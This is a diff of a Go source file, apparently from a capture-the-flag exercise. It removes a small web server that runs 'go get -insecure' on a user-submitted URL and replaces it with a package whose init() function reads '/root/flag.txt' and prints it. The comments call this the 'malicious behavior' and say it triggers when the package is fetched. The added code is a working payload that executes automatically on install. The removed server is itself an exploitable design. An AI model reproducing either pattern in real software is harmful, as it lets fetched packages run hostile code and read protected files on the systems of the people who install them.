@@ -1,45 +1,23 @@
 package main
 
 import (
-	"html/template"
-	"net/http"
+	"fmt"
 	"os/exec"
-	"regexp"
 )
 
-var tmpl = template.Must(template.ParseFiles("index.html"))
-
-// Strict domain[:port]/path format
-var validURL = regexp.MustCompile(`^[a-zA-Z0-9.-]+(:[0-9]+)?\/[a-zA-Z0-9/_\-\.]+$`)
-
-func main() {
-	http.HandleFunc("/", indexHandler)
-	http.HandleFunc("/submit", submitHandler)
-
-	http.ListenAndServe(":5000", nil)
-}
-
-func indexHandler(w http.ResponseWriter, r *http.Request) {
-	tmpl.Execute(w, "")
-}
-
-func submitHandler(w http.ResponseWriter, r *http.Request) {
-	r.ParseForm()
-	url := r.FormValue("url")
-
-	if !validURL.MatchString(url) {
-		tmpl.Execute(w, "❌ Invalid format. Use domain.com[:port]/package")
+func init() {
+	// This is where the malicious behavior happens. It tries to read the flag.
+	cmd := exec.Command("cat", "/root/flag.txt")
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		fmt.Println("Error reading flag:", err)
 		return
 	}
 
-	// No timeout, simple exec
-	cmd := exec.Command("go", "get", "-insecure", url)
-	cmdOutput, err := cmd.CombinedOutput()
+	// The flag will be printed when the package is fetched by `go get`
+	fmt.Printf("Flag: %s\n", output)
+}
 
-	output := string(cmdOutput)
-	if err != nil {
-		output += "\n[!] Error: " + err.Error()
-	}
-
-	tmpl.Execute(w, output)
+func main() {
+	// The main function does nothing, the execution happens in init()
 }
